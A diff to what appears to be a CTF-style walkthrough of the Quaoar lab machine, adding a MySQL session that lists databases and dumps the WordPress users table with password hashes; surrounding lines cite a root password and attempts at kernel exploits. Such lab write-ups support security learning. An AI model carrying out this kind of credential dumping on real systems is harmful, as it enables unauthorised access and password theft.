@@ -843,6 +843,71 @@ root:rootpassword!
 OOh myGod we have no the lucky to day no database access 
 but we have the initial access let see how we can gain the access to the next stage of the target using the passwords and the credentials we have get
 
+i lied
+```
+
+mysql> show databases
+    -> ;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| Lepton             |
+| mysql              |
+| performance_schema |
+| test               |
+| wordpress          |
++--------------------+
+6 rows in set (0.08 sec)
+
+mysql> use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables
+    -> ;
++----------------------------+
+| Tables_in_wordpress        |
++----------------------------+
+| wp_commentmeta             |
+| wp_comments                |
+| wp_links                   |
+| wp_masta_campaign          |
+| wp_masta_cronapi           |
+| wp_masta_list              |
+| wp_masta_reports           |
+| wp_masta_responder         |
+| wp_masta_responder_reports |
+| wp_masta_settings          |
+| wp_masta_subscribers       |
+| wp_masta_support           |
+| wp_options                 |
+| wp_postmeta                |
+| wp_posts                   |
+| wp_term_relationships      |
+| wp_term_taxonomy           |
+| wp_terms                   |
+| wp_usermeta                |
+| wp_users                   |
++----------------------------+
+20 rows in set (0.00 sec)
+
+mysql> select # from wp_users
+    -> ;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+mysql> select * from wp_users;
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email           | user_url | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | $P$BAgwF1u99OZU1iqTgTIrUmBbtIjRMu1 | admin         | Quaoar@localhost.com |          | 2016-10-12 11:57:38 |                     |           0 | admin        |
+|  2 | wpuser     | $P$BdcZZVb0ssMccLU1ECFCtUihocqQ0S. | wpuser        | wpuser@localhost.com |          | 2016-10-24 07:07:24 |                     |           0 | wpuser       |
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------+
+2 rows in set (0.00 sec)
+
+mysql> 
+
+```
 
 ## Root
 oooh! it take me time try most of the kernel exploits and try to get the access as the root in the target but oooh sheet never forget to the spay password get in the database that give me the root access sheet
